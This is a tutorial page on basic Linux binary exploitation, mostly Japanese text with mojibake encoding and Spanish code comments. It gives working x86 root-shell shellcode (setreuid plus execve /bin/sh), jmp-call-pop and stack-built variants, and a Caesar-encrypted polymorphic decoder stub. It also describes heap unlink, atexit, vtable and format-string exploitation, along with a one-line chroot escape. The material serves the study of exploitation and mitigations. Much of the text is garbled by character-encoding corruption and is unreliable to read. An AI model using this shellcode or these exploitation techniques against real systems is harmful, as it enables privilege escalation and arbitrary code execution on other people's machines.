# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆã¯** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* **ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã« PR ã‚’é€ä¿¡ã—ã¦** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® github ãƒªãƒã‚¸ãƒˆãƒªã«è²¢çŒ®ã—ã¦ãã ã•ã„

</details>

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** â€”> Returns a .o file\
**ld assembly.o -o shellcodeout** â€”> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ãŒæ­£ã—ãè¡Œã‚ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€å‰è¿°ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ãŒ**strace ./PROGRAMA\_COMPILADO**ã«è¡¨ç¤ºã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹éš›ã«ã¯ã€ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æœ€åˆã®å‘½ä»¤ã¯callã¸ã®ã‚¸ãƒ£ãƒ³ãƒ—ã§ã™ã€‚callã¯å…ƒã®ã‚³ãƒ¼ãƒ‰ã‚’å‘¼ã³å‡ºã—ã€ã•ã‚‰ã«EIPã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«å…¥ã‚Œã¾ã™ã€‚callå‘½ä»¤ã®å¾Œã«å¿…è¦ãªæ–‡å­—åˆ—ã‚’å…¥ã‚Œã¦ãŠã‚Šã€ãã®EIPã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‚’æŒ‡ã—ç¤ºã—ã€ã•ã‚‰ã«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

ä¾‹ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Stackã‚’ä½¿ç”¨ã—ãŸEJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**  
EJ FNSTENV å‘½ä»¤ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®ç’°å¢ƒã‚’ä¿å­˜ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Hunter:**

ãƒ—ãƒ­ã‚»ã‚¹ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸãƒ¡ãƒ¢ãƒªãƒšãƒ¼ã‚¸ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€ãã“ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ¢ã™å°ã•ãªã‚³ãƒ¼ãƒ‰ã§ã™ï¼ˆã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«é…ç½®ã•ã‚ŒãŸã„ãã¤ã‹ã®ç½²åã‚’æ¢ã—ã¾ã™ï¼‰ã€‚ã‚³ãƒ¼ãƒ‰ã‚’ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã™ã‚‹ãŸã‚ã®å°ã•ãªã‚¹ãƒšãƒ¼ã‚¹ã—ã‹æŒã£ã¦ã„ãªã„å ´åˆã«ä¾¿åˆ©ã§ã™ã€‚

**Polymorphic Shellcodes**

ã“ã‚Œã¯ã€æš—å·åŒ–ã•ã‚ŒãŸã‚·ã‚§ãƒ«ã§ã€ãã‚Œã‚‰ã‚’å¾©å·åŒ–ã—ã¦ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹å°ã•ãªã‚³ãƒ¼ãƒ‰ã‚’æŒã£ã¦ãŠã‚Šã€Call-Popãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯**ã‚·ãƒ¼ã‚¶ãƒ¼æš—å·åŒ–ã®ä¾‹**ã§ã™ã€‚
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5.è£œè¶³æ‰‹æ³•**

**Muratã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯**

Linuxã§ã¯ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒ0xbfffffffã‹ã‚‰ãƒãƒƒãƒ—ã•ã‚Œã¾ã™ã€‚

Linuxã®æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚¹ã‚¿ãƒƒã‚¯ãŒã©ã®ã‚ˆã†ã«æ§‹ç¯‰ã•ã‚Œã‚‹ã‹ã‚’è¦‹ã‚‹ã¨ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã¿ã®ç’°å¢ƒã§èµ·å‹•ã•ã‚Œã‚‹ã‚ˆã†ã«ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’é–‹ç™ºã§ãã¾ã™ã€‚ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯æ¬¡ã®ã‚ˆã†ã«è¨ˆç®—ã§ãã¾ã™: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚€ç’°å¢ƒå¤‰æ•°ãŒã‚ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç°¡å˜ã«å–å¾—ã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€execleé–¢æ•°ãŒæœ›ã‚€ç’°å¢ƒå¤‰æ•°ã®ã¿ã‚’æŒã¤ç’°å¢ƒã‚’ä½œæˆã§ãã‚‹ãŸã‚ã«å¯èƒ½ã§ã™ã€‚

##

###

###

###

###

### **ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã‚’ä½¿ã£ãŸãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼**

**sprintf**ã¯ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’å¤‰æ•°ã«ç§»å‹•ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ–‡å­—åˆ—ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã‚’æ‚ªç”¨ã—ã¦ã€ã‚³ãƒ”ãƒ¼å…ˆã®å¤‰æ•°ã§ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãŸã¨ãˆã°ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰`%.44xAAAA`ã¯ã€å¤‰æ•°ã«44B+"AAAA"ã‚’æ›¸ãè¾¼ã¿ã€ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### **\_\_atexitæ§‹é€ ä½“**

{% hint style="danger" %}
ç¾åœ¨ã€ã“ã‚Œã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ã®ã¯éå¸¸ã«çã—ã„ã§ã™ã€‚
{% endhint %}

**`atexit()`**ã¯ã€ä»–ã®é–¢æ•°ã‚’ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã¨ã—ã¦æ¸¡ã™é–¢æ•°ã§ã™ã€‚ã“ã‚Œã‚‰ã®é–¢æ•°ã¯ã€**`exit()`**ã®å®Ÿè¡Œæ™‚ã‚„**main**ã®æˆ»ã‚Šæ™‚ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚\
ãŸã¨ãˆã°ã€ã“ã‚Œã‚‰ã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æŒ‡ã™ã‚ˆã†ã«å¤‰æ›´ã§ãã‚Œã°ã€ãƒ—ãƒ­ã‚»ã‚¹ã‚’åˆ¶å¾¡ã§ãã¾ã™ãŒã€ç¾åœ¨ã¯ã‚ˆã‚Šè¤‡é›‘ã§ã™ã€‚\
ç¾åœ¨ã€å®Ÿè¡Œã•ã‚Œã‚‹é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ã„ãã¤ã‹ã®æ§‹é€ ä½“ã«éš ã•ã‚Œã¦ãŠã‚Šã€æœ€çµ‚çš„ã«ãã‚ŒãŒæŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ã¯ãªãã€**XOR**ã¨ãƒ©ãƒ³ãƒ€ãƒ ã‚­ãƒ¼ã§æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚ãã®ãŸã‚ã€ã“ã®æ”»æ’ƒãƒ™ã‚¯ãƒˆãƒ«ã¯ç¾åœ¨ã€**x86**ãŠã‚ˆã³**x64_86**ã§ã¯ã‚ã¾ã‚Šæœ‰ç”¨ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚\
æš—å·åŒ–é–¢æ•°ã¯**`PTR_MANGLE`**ã§ã™ã€‚**m68kã€mips32ã€mips64ã€aarch64ã€armã€hppa**ãªã©ã®**ä»–ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£**ã¯ã€ã“ã®æš—å·åŒ–é–¢æ•°ã‚’å®Ÿè£…ã—ã¦ã„ãªã„ãŸã‚ã€ã“ã®ãƒ™ã‚¯ãƒˆãƒ«ã«ã‚ˆã‚‹æ”»æ’ƒãŒå¯èƒ½ã§ã™ã€‚

### **setjmp()ã¨longjmp()**

{% hint style="danger" %}
ç¾åœ¨ã€ã“ã‚Œã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ã®ã¯éå¸¸ã«çã—ã„ã§ã™ã€‚
{% endhint %}

**`Setjmp()`**ã¯ã€ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆï¼ˆãƒ¬ã‚¸ã‚¹ã‚¿ï¼‰ã‚’ä¿å­˜ã—ã¾ã™ã€‚\
**`longjmp()`**ã¯ã€ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’å¾©å…ƒã—ã¾ã™ã€‚\
ä¿å­˜ã•ã‚Œã‚‹ãƒ¬ã‚¸ã‚¹ã‚¿ã¯ã€`EBXã€ESIã€EDIã€ESPã€EIPã€EBP`ã§ã™ã€‚\
ãŸã ã—ã€EIPã¨ESPã¯**`PTR_MANGLE`**é–¢æ•°ã«ã‚ˆã£ã¦æ¸¡ã•ã‚Œã‚‹ãŸã‚ã€ã“ã®æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¯ä¸Šè¨˜ã¨åŒã˜ã§ã™ã€‚\
ã‚¨ãƒ©ãƒ¼å›å¾©ã‚„å‰²ã‚Šè¾¼ã¿ã«å½¹ç«‹ã¡ã¾ã™ã€‚\
ãŸã ã—ã€ä»–ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã¯ä¿è­·ã•ã‚Œã¦ã„ãªã„ã¨ã„ã†æƒ…å ±ã‚‚ã‚ã‚Šã¾ã™ã®ã§ã€å‘¼ã³å‡ºã•ã‚Œã‚‹é–¢æ•°å†…ã«`call ebx`ã€`call esi`ã€`call edi`ãŒã‚ã‚‹å ´åˆã€åˆ¶å¾¡ã‚’å–å¾—ã§ãã¾ã™ã€‚ã¾ãŸã€ESPã‚’å¤‰æ›´ã—ã¦EBPã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

**C++ã®VTableã¨VPTR**

å„ã‚¯ãƒ©ã‚¹ã«ã¯ã€ãƒ¡ã‚½ãƒƒãƒ‰ã¸ã®ãƒã‚¤ãƒ³ã‚¿ã®é…åˆ—ã§ã‚ã‚‹**Vtable**ãŒã‚ã‚Šã¾ã™ã€‚

å„ã‚¯ãƒ©ã‚¹ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ã€ãã®ã‚¯ãƒ©ã‚¹ã®é…åˆ—ã¸ã®ãƒã‚¤ãƒ³ã‚¿ã§ã‚ã‚‹**VPtr**ãŒã‚ã‚Šã¾ã™ã€‚VPtrã¯å„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®ä¸€éƒ¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€VPtrã‚’ä¸Šæ›¸ãã™ã‚‹ã¨ã€ãƒ€ãƒŸãƒ¼ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒ‡ã™ã‚ˆã†ã«å¤‰æ›´ã§ãã€é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«ç§»å‹•ã—ã¾ã™ã€‚

## **äºˆé˜²æªç½®ã¨å›é¿ç­–**

###

**Libsafeã®ç½®æ›**

æ¬¡ã®ã‚ˆã†ã«æœ‰åŠ¹ã«ãªã‚Šã¾ã™: LD_PRELOAD=/lib/libsafe.so.2\
ã¾ãŸã¯\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

ã„ãã¤ã‹ã®å±é™ºãªé–¢æ•°å‘¼ã³å‡ºã—ã‚’å®‰å…¨ãªé–¢æ•°å‘¼ã³å‡ºã—ã«ç½®ãæ›ãˆã¾ã™ã€‚æ¨™æº–åŒ–ã•ã‚Œã¦ã„ã¾ã›ã‚“ï¼ˆx86å°‚ç”¨ã€-fomit-frame-pointerã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ãªã„ã€é™çš„ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã§ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€ã™ã¹ã¦ã®è„†å¼±ãªé–¢æ•°ãŒå®‰å…¨ã«ãªã‚‹ã‚ã‘ã§ã¯ãªãã€LD_PRELOADã¯setuidãƒã‚¤ãƒŠãƒªã§ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ï¼‰ã€‚

**ASCIIã‚¢ãƒ¼ãƒãƒ¼ãƒ‰ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚¹ãƒšãƒ¼ã‚¹**

å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’0x00000000ã‹ã‚‰0x00ffffffã«ãƒ­ãƒ¼ãƒ‰ã—ã¦ã€å¸¸ã«0x00ãƒã‚¤ãƒˆãŒã‚ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ãŸã ã—ã€ã“ã‚Œã¯ã»ã¨ã‚“ã©ã™ã¹ã¦ã®æ”»æ’ƒã‚’é˜²ãã“ã¨ã¯ã§ããšã€ãƒªãƒˆãƒ«ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã§ã¯ãªãŠã•ã‚‰ã§ã™ã€‚

**ret2plt**

strcpy@pltï¼ˆpltã‹ã‚‰ï¼‰ã‚’å‘¼ã³å‡ºã—ã€GOTã®ã‚¨ãƒ³ãƒˆãƒªã‚’æŒ‡ã—ã€å‘¼ã³å‡ºã—ãŸã„é–¢æ•°ï¼ˆsystem()ï¼‰ã®æœ€åˆã®ãƒã‚¤ãƒˆã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹ã‚ˆã†ã«ROPã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§æ§‹æˆã•ã‚Œã¾ã™ã€‚ãã®å¾Œã€GOT+1ã‚’æŒ‡ã—ã€system()ã®2ç•ªç›®ã®ãƒã‚¤ãƒˆã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚æœ€å¾Œã«ã€GOTã«ä¿å­˜ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆsystem()ã«ãªã‚‹ã¯ãšï¼‰ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

**chroot()ã«ã‚ˆã‚‹ã‚¸ã‚§ã‚¤ãƒ«**

debootstrap -arch=i386 hardy /home/user â€”> ç‰¹å®šã®ã‚µãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«åŸºæœ¬ã‚·ã‚¹ãƒ†ãƒ ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚

ç®¡ç†è€…ã¯ã€ã“ã‚Œã‚‰ã®ã‚¸ã‚§ã‚¤ãƒ«ã‹ã‚‰æŠœã‘å‡ºã™ã“ã¨ãŒã§ãã¾ã™: mkdir foo; chroot foo; cd ..

**ã‚³ãƒ¼ãƒ‰ã‚¤ãƒ³ã‚¹ãƒˆã‚¥ãƒ«ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**

Valgrind â€”> ã‚¨ãƒ©ãƒ¼ã‚’æ¤œå‡ºã—ã¾ã™\
Memcheck\
RADï¼ˆReturn Address Defenderï¼‰\
Insure++

## **8 ãƒ’ãƒ¼ãƒ—ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼: åŸºæœ¬çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**

**å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯**

prev_size |\
size | â€”ãƒ˜ãƒƒãƒ€ãƒ¼\
\*mem | ãƒ‡ãƒ¼ã‚¿

**ãƒ•ãƒªãƒ¼ãƒãƒ£ãƒ³ã‚¯**

prev_size |\
size |\
\*fd | æ¬¡ã®ãƒãƒ£ãƒ³ã‚¯ã¸ã®ãƒã‚¤ãƒ³ã‚¿\
\*bk | å‰ã®ãƒãƒ£ãƒ³ã‚¯ã¸ã®ãƒã‚¤ãƒ³ã‚¿ â€”ãƒ˜ãƒƒãƒ€ãƒ¼\
\*mem | ãƒ‡ãƒ¼ã‚¿

ãƒ•ãƒªãƒ¼ãƒãƒ£ãƒ³ã‚¯ã¯ãƒ€ãƒ–ãƒ«ãƒªãƒ³ã‚¯ãƒªã‚¹ãƒˆï¼ˆbinï¼‰ã«ã‚ã‚Šã€2ã¤ã®ãƒ•ãƒªãƒ¼ãƒãƒ£ãƒ³ã‚¯ãŒé€£ç¶šã—ã¦å­˜åœ¨ã™ã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

ã€Œsizeã€ã«ã¯ã€å‰ã®ãƒãƒ£ãƒ³ã‚¯ãŒä½¿ç”¨ä¸­ã§ã‚ã‚‹ã‹ã€mmap()ã‚’ä»‹ã—ã¦å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸã‹ã€ãƒ—ãƒ©ã‚¤ãƒãƒªã‚¢ãƒªãƒ¼ãƒŠã«å±ã—ã¦ã„ã‚‹ã‹ã‚’ç¤ºã™ãƒ“ãƒƒãƒˆãŒã‚ã‚Šã¾ã™ã€‚

ãƒãƒ£ãƒ³ã‚¯ã‚’è§£æ”¾ã™ã‚‹ã¨ã€éš£æ¥ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ãŒç©ºã„ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã‚‰ã¯unlink()ãƒã‚¯ãƒ­ã‚’ä»‹ã—ã¦çµåˆã•ã‚Œã€æ–°ã—ã„æœ€å¤§ã®ãƒãƒ£ãƒ³ã‚¯ãŒfrontlink()ã«æ¸¡ã•ã‚Œã€é©åˆ‡ãªbinã«æŒ¿å…¥ã•ã‚Œã¾ã™ã€‚

unlink(){\
BK = P->bk; â€”> æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã®BKã¯ä»¥å‰ã«ç©ºã„ã¦ã„ãŸã‚‚ã®ã®BK\
FD = P->fd; â€”> æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã®FDã¯ä»¥å‰ã«ç©ºã„ã¦ã„ãŸã‚‚ã®ã®FD\
FD->bk = BK; â€”> æ¬¡ã®ãƒãƒ£ãƒ³ã‚¯ã®BKã¯æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã‚’æŒ‡ã™\
BK->fd = FD; â€”> å‰ã®ãƒãƒ£ãƒ³ã‚¯ã®FDã¯æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã‚’æŒ‡ã™\
}

ã—ãŸãŒã£ã¦ã€P->bkã‚’ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã€P->fdã‚’GOTã¾ãŸã¯DTORSã®ã‚¨ãƒ³ãƒˆãƒªã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰12æ¸›ç®—ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã«å¤‰æ›´ã™ã‚‹ã¨ã€æ¬¡ã®ã“ã¨ãŒé”æˆã•ã‚Œã¾ã™:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’çµ‚äº†ã™ã‚‹ã¨ãã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

ã•ã‚‰ã«ã€unlink()ã®4ç•ªç›®ã®ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã¯ä½•ã‹ã‚’æ›¸ãè¾¼ã¿ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ã“ã‚Œã«å¯¾ã—ã¦ä¿®æ­£ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®8ãƒã‚¤ãƒˆç›®ã‹ã‚‰4ãƒã‚¤ãƒˆãŒæ›¸ãè¾¼ã¾ã‚Œã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®æœ€åˆã®å‘½ä»¤ãŒã“ã‚Œã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¦æ®‹ã‚Šã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«ç§»å‹•ã™ã‚‹ã‚ˆã†ã«ã™ã‚‹nopsã«åˆ°é”ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯æ¬¡ã®ã‚ˆã†ã«ä½œæˆã•ã‚Œã¾ã™:

buffer1ã«ã€nopsã«ç§»å‹•ã™ã‚‹jmpã§å§‹ã¾ã‚‹ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚

